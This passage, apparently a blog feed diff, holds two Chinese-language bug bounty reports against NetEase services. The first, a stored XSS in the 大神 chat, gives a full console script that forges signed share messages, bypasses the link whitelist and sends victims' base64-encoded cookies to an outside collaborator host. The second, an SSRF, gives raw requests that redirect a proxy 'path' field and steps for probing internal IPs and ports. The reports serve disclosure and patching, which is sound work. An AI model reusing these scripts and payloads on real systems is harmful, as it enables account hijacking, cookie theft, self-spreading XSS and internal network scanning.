+ <img src="/assets/images/share.png" alt="share" /></li>
+  <li>
+    <p>构造xss payload。将分享链接设置为javascript://协议头，并且带上我们的payload，将fromUid设置为攻击者的UID，将url设置为javascript://%0aalert("xss")，然后用上一步的gen_sign函数对请求体进行校验后，构造合法的post请求，实现分享发帖。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> {"serverId":"0149881871","channelId":"1459515","squareId":"60054a7dd5456877d226706e","fromUid":"b1fbb501020c46ff88577a3fe103c0ec","fromNick":"","msgType":"CHAT_ROOM_MSG","sourceType":"GOD_WEB","content":{"attachType":"link","attachData":{"title":"p","url":"javascript://%0aalert(\"xss\");"}},"contentType":"SHARE"}
+</code></pre></div>    </div>
+
+    <p>为简化操作，写一个js文件，实现自动发帖，请将下面脚本粘贴并且复制到大神网页的Console中执行。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // burpsuite collaborator url
+ const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+ // init webassembly and get sig_gen function
+ // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
+ var moduleX;
+ Promise.all([sig.default()]).then(function (t) {
+     moduleX = t
+ })
+
+ // 获取cookie信息
+ const getCookieValue = (name) =&gt; (
+     document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+ )
+
+ const myFetch = async (url, headers) =&gt; {
+     let data = await fetch(url, {
+         method: 'GET',
+         headers: headers,
+         credentials: 'include'
+     })
+     let res = await data.json();
+     return res
+ }
+ // 构造GET发送请求
+ const setHeaderDs = (payload) =&gt; {
+     var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
+     var GL_Uid = getCookieValue('GOD_UUID')
+     var checkres = moduleX['0'].gen_sign(payload)
+     var checkjson = JSON.parse(checkres)
+     var GL_CheckSum = checkjson['sign']
+     var GL_Nonce = checkjson['timestamp']
+     var GL_ClientType = 61
+     var GL_DeviceId = localStorage.getItem('ns-client-id')
+     var headers = {
+         'GL-CheckSum': GL_CheckSum,
+         'GL-Nonce': GL_Nonce,
+         'GL-Uid': GL_Uid,
+         'GL-DeviceId': GL_DeviceId,
+         'GL-ClientType': GL_ClientType,
+         'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
+         'Content-Type': 'application/json;charset=UTF-8'
+     }
+     return headers
+ }
+
+ // 构造POST发送请求
+ const myPostFetch = async (url, headers, payload) =&gt; {
+     let data = await fetch(url, {
+         method: 'POST',
+         headers: headers,
+         credentials: 'include',
+         body: JSON.stringify(payload),
+     })
+     let res = await data.json();
+     return res
+ }
+
+ // 通过img src来向burpsuite collaborator url外送敏感新信息
+ const justSend = async url =&gt; {
+     var Img = new Image
+     Img.src = url
+ }
+
+ // base64 加解密
+ const encode = str =&gt; {
+     var b64 = btoa(unescape(encodeURIComponent(str)))
+     return b64
+ }
+ const decode = str =&gt; {
+     var str = decodeURIComponent(escape(atob(str)));
+     return str
+ }
+ //获取并发送cookie，带有手机号
+ const sendCookie = () =&gt; {
+     var encoded = encode(document.cookie)
+     // send data
+     justSend(api_burp + '?data=' + encoded)
+ }
+
+ // 发送xss payload
+ const startSendLinkMessage = async function () {
+
+     // 链接，设置fromUid为攻击者的UID
+     var payload_json = { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "点击惊喜", "url": "javascript://%0aalert(\"xss\");", "desc": "XXXXXXXSSSSSSSSS", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }
+
+     var headers = setHeaderDs(JSON.stringify(payload_json))
+     res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
+ }
+ startSendLinkMessage()
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>将上面的脚本复制到大神页面的console执行，注意修改请求体的fromUid为攻击者的Uid，执行后，链接发送成功，受害者点击后，首先网页提示非大神链接谨慎访问（前端会检测链接是否在白名单中，如果不在则提示链接风险，但是可以绕过，见下文），点击打开，XSS弹框出现！</p>
+
+    <p><img src="/assets/images/warning.png" alt="warning" />
+ <img src="/assets/images/alert.png" alt="alert" /></p>
+  </li>
+  <li>
+    <p>绕过非大神链接谨慎访问校验</p>
+
+    <p>首先对非大神进行unicode编码，然后全局搜索该编码可以定位到弹框出现的代码位置。
+ <img src="/assets/images/unicode.png" alt="unicode" />
+ 弹框代码位置：https://g.166.net/res/a19/p__channel__serverId__channelId.abd939d2.async.js
+ <img src="/assets/images/block.png" alt="block" />
+ 定位到如下校验逻辑，代码地址为：https://g.166.net/res/a19/p__channel__serverId__channelId.abd939d2.async.js
+ <img src="/assets/images/whitelist.png" alt="whitelist" />
+ 为绕过校验，只需要将帖子的链接javascript://%0aalert("xss");变成javascript://%0aalert("xss");var a="163.com"即可，由于链接中第一次出现的域名是163.com,因此在白名单中，提示框并不会出现了。修改脚本中的xss payload请求如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // 发送xss payload
+ const startSendLinkMessage = async function () {
+
+     // 链接，设置fromUid为攻击者的UID
+     var payload_json = { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "点击惊喜", "url": "javascript://%0aalert(\"xss\");var a=\"163.com\";", "desc": "XXXXXXXSSSSSSSSS", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }
+
+     var headers = setHeaderDs(JSON.stringify(payload_json))
+     res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
+ }
+ startSendLinkMessage()
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>该XSS的利用</p>
+
+    <ul>
+      <li>
+        <p>首先是窃取cookie，可能会带有邮箱和手机号信息</p>
+
+        <p><img src="/assets/images/cookie.png" alt="cookie" /></p>
+      </li>
+      <li>
+        <p>伪造发送消息等</p>
+
+        <p>前文通过脚本发送合法请求，已经足够证明攻击者能伪造用户发送消息。只需要把该脚本上传到https服务器，并且通过xss payload下载恶意脚本，能够执行更加复杂的逻辑。</p>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POC视频链接如下：链接：https://pan.baidu.com/s/1aOqi-sLgA5XJIw3FUPiTIw 提取码：1314
+</code></pre></div></div>
+
+<p>完整利用脚本如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    // burpsuite collaborator url
+    const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+    // init webassembly and get sig_gen function
+    // 获取签名函数，该函数的实现为webassembly，但是全局模块sig暴露webassembly的接口，可以直接进行调用
+    var moduleX;
+    Promise.all([sig.default()]).then(function (t) {
+        moduleX = t
+    })
+
+    // 获取cookie信息
+    const getCookieValue = (name) =&gt; (
+        document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+    )
+
+    const myFetch = async (url, headers) =&gt; {
+        let data = await fetch(url, {
+            method: 'GET',
+            headers: headers,
+            credentials: 'include'
+        })
+        let res = await data.json();
+        return res
+    }
+    // 构造GET发送请求
+    const setHeaderDs = (payload) =&gt; {
+        var GL_X_XSRF_TOKEN = getCookieValue('GL-XSRF-TOKEN')
+        var GL_Uid = getCookieValue('GOD_UUID')
+        var checkres = moduleX['0'].gen_sign(payload)
+        var checkjson = JSON.parse(checkres)
+        var GL_CheckSum = checkjson['sign']
+        var GL_Nonce = checkjson['timestamp']
+        var GL_ClientType = 61
+        var GL_DeviceId = localStorage.getItem('ns-client-id')
+        var headers = {
+            'GL-CheckSum': GL_CheckSum,
+            'GL-Nonce': GL_Nonce,
+            'GL-Uid': GL_Uid,
+            'GL-DeviceId': GL_DeviceId,
+            'GL-ClientType': GL_ClientType,
+            'GL-X-XSRF-TOKEN': GL_X_XSRF_TOKEN,
+            'Content-Type': 'application/json;charset=UTF-8'
+        }
+        return headers
+    }
+
+    // 构造POST发送请求
+    const myPostFetch = async (url, headers, payload) =&gt; {
+        let data = await fetch(url, {
+            method: 'POST',
+            headers: headers,
+            credentials: 'include',
+            body: JSON.stringify(payload),
+        })
+        let res = await data.json();
+        return res
+    }
+
+    // 通过img src来向burpsuite collaborator url外送敏感新信息
+    const justSend = async url =&gt; {
+        var Img = new Image
+        Img.src = url
+    }
+
+    // base64 加解密
+    const encode = str =&gt; {
+        var b64 = btoa(unescape(encodeURIComponent(str)))
+        return b64
+    }
+    const decode = str =&gt; {
+        var str = decodeURIComponent(escape(atob(str)));
+        return str
+    }
+    //获取并发送cookie，可能带有手机号
+    const sendCookie = () =&gt; {
+        var encoded = encode(document.cookie)
+        // send data
+        justSend(api_burp + '?data=' + encoded)
+    }
+
+    // 发送xss payload
+    const startSendLinkMessage = async function () {
+
+        // 链接，设置fromUid为攻击者的UID
+        var payload_json = { "serverId": "0149881871", "channelId": "1459515", "squareId": "60054a7dd5456877d226706e", "fromUid": "b1fbb501020c46ff88577a3fe103c0ec", "fromNick": "", "msgType": "CHAT_ROOM_MSG", "sourceType": "GOD_WEB", "content": { "attachType": "link", "attachData": { "title": "p", "url": "javascript://%0avar a=\"163.com\";alert(document.cookie);", "desc": "o", "icon": "https://baidu.com/p.png" } }, "contentType": "SHARE" }
+
+        var headers = setHeaderDs(JSON.stringify(payload_json))
+        res = await myPostFetch('https://inf-im.ds.163.com/v1/web/chat-room-msg/send-msg', headers, payload_json)
+    }
+    // 判断pc端还是手机端
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    if (isMobile) {
+        /* your code here */
+    } else {
+        //web端
+        //伪造发分享消息
+        startSendLinkMessage()
+        //发送cookie
+        sendCookie()
+        
+    }
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+<p>通过发送受诱惑的链接，诱导受害者点击，便可完成xss攻击。注意到大神平台多款游戏频道用户超过几十上百万，影响深远。</p>
+<ol>
+  <li>攻击者可以在聊天群发送xss链接，用户点击后能够执行，大规模收集平台用户手机号和账号信息，造成敏感信息泄漏；</li>
+  <li>攻击者可以在聊天群发送xss链接，用户点击后能够执行，伪造用户发消息等，制造XSS蠕虫，实现XSS帖子的自我复制，扩大影响。</li>
+</ol>
+
+<h2 id="patch-advice">Patch advice</h2>
+<ol>
+  <li>对用户的分享链接进行过滤</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">低危：网易UU论坛深井Web版评论等功能存在SSRF漏洞</title><link href="http://localhost:4000/xss/2023/09/20/uu-ssrf.html" rel="alternate" type="text/html" title="低危：网易UU论坛深井Web版评论等功能存在SSRF漏洞" /><published>2023-09-20T10:26:18+08:00</published><updated>2023-09-20T10:26:18+08:00</updated><id>http://localhost:4000/xss/2023/09/20/uu-ssrf</id><content type="html" xml:base="http://localhost:4000/xss/2023/09/20/uu-ssrf.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>网易UU论坛深井Web版评论等功能存在SSRF漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>web漏洞，SSRF</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>低危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POST https://sowellwell.com/w/v1/comment/proxy</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /w/v1/comment/proxy HTTP/2
+Host: sowellwell.com
+Cookie: jssdk_deviceid=xxx; _sj_web_session_id=xxx
+Content-Length: 351
+Identifier: jssdk_sD3SHpGpz24cW77h
+Accept: application/json, text/plain, */*
+Content-Type: application/json;charset=UTF-8
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://sowellwell.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://sowellwell.com/ts/1WF/4zM4?from=comment
+Accept-Encoding: gzip, deflate
+
+{"path":"@f5lknriqserdumix73rrr8s32u8lwbk0.oastify.com/like/apps/uu/server/create_like","method":"POST","params":{"uid":"140250100348","msg_id":"64ff26109bee0901b241c179","user_info":{"game_uid":"140250100348","name":"笠泽九斤翅子树","avatar":"https://uu.fp.ps.netease.com/file/64e4d0622935c59e9fcafa18xTIqMl0f05","user_type":1,"extra":""}},"id":"64fefa7c25eb02e49155e0a7","server_type":1}
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+<p>网易UU加速器论坛深井<code class="language-plaintext highlighter-rouge">https://sowellwell.com</code>的回复点赞等功能存在ssrf漏洞，攻击者能够通过该漏洞遍历内网机器和开放端口。</p>
+
+<h3 id="detail">Detail</h3>
+<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>登录Web版深井账号，并且点开任意帖子并且发表评论或者对某评论进行点赞操作，同时用burpsuite记录点赞时的请求为POST请求<code class="language-plaintext highlighter-rouge">https://sowellwell.com/w/v1/comment/proxy</code>
+<img src="/assets/uu_ssrf/like.png" alt="like" /></p>
+  </li>
+  <li>
+    <p>观察到请求体中有一个<code class="language-plaintext highlighter-rouge">path</code>字段，指向某个相对路径，于是尝试用@符号进行绕过。如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 某域名+/like/apps/uu/server/create_like = 完整url
+ 某域名+@攻击者控制的域名+/like/apps/uu/server/create_like = 攻击者url，而原始的域名则解析为账号字段
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>将<code class="language-plaintext highlighter-rouge">path</code>字段修改为burp collaborator进行测试</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> POST /w/v1/comment/proxy HTTP/2
+ Host: sowellwell.com
+ Cookie: jssdk_deviceid=xxx; _sj_web_session_id=xxx
+ Content-Length: 351
+ Identifier: jssdk_sD3SHpGpz24cW77h
+ Accept: application/json, text/plain, */*
+ Content-Type: application/json;charset=UTF-8
+ Sec-Ch-Ua-Platform: "Windows"
+ Origin: https://sowellwell.com
+ Sec-Fetch-Site: same-origin
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Dest: empty
+ Referer: https://sowellwell.com/ts/1WF/4zM4?from=comment
+ Accept-Encoding: gzip, deflate
+
+ {"path":"@f5lknriqserdumix73rrr8s32u8lwbk0.oastify.com/like/apps/uu/server/create_like","method":"POST","params":{"uid":"140250100348","msg_id":"64ff26109bee0901b241c179","user_info":{"game_uid":"140250100348","name":"笠泽九斤翅子树","avatar":"https://uu.fp.ps.netease.com/file/64e4d0622935c59e9fcafa18xTIqMl0f05","user_type":1,"extra":""}},"id":"64fefa7c25eb02e49155e0a7","server_type":1}
+</code></pre></div>    </div>
+
+    <p>collaborator接收到UU服务器发送的请求：
+ <img src="/assets/uu_ssrf/collabo.png" alt="collabo" /></p>
+  </li>
+  <li>
+    <p>获取内网域名</p>
+
+    <p>将地址故意填错，可以观察到返回的错误字段包含内网域名信息，例如<code class="language-plaintext highlighter-rouge">path</code>字段填<code class="language-plaintext highlighter-rouge">abc</code>，服务器返回错误域名为：<code class="language-plaintext highlighter-rouge">in.mobile-community.uu.netease.comabc</code>，那么原始的域名为<code class="language-plaintext highlighter-rouge">in.mobile-community.uu.netease.com</code></p>
+
+    <p><img src="/assets/uu_ssrf/domain.png" alt="domain" /></p>
+  </li>
+  <li>
+    <p>获取域名IP地址</p>
+
+    <p>通过dig命令可以查看该域名绑定的内网地址为<code class="language-plaintext highlighter-rouge">10.90.105.177</code>
+ <img src="/assets/uu_ssrf/dig.png" alt="dig" /></p>
+  </li>
+  <li>
+    <p>遍历内网IP</p>
+
+    <p>获取启动的服务ip：
+ <img src="/assets/uu_ssrf/valid.png" alt="valid" /></p>
+
+    <p>未启动的服务ip：
+ <img src="/assets/uu_ssrf/invalid.png" alt="invalid" /></p>
+  </li>
+  <li>
+    <p>遍历内网开放端口</p>
+
+    <p>以<code class="language-plaintext highlighter-rouge">10.90.105.241</code>为例，尝试遍历常见端口，发现端口8080开放
+ <img src="/assets/uu_ssrf/ports.png" alt="ports" /></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<h2 id="impact">Impact</h2>
+<ol>
+  <li>攻击者通过该漏洞遍历内网IP和端口开放信息，造成内网信息泄露
+    <h2 id="patch-advice">Patch advice</h2>
+  </li>
+  <li>对潜在的请求<code class="language-plaintext highlighter-rouge">path</code>字段进行合法性校验</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
